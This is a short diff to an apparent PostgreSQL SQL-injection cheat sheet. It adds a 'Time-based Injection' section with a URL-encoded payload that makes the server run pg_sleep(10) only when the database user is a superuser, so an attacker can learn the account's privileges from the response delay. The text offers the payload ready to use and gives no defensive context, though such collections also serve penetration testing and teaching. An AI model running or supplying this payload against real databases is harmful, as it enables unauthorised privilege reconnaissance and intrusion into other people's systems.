@@ -38,3 +38,10 @@ COPY 1
 
 Query returned successfully in 201 msec.
 ```
+
+### Time-based Injection
+
+Check if executing as DBA:
+```
+SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
+```
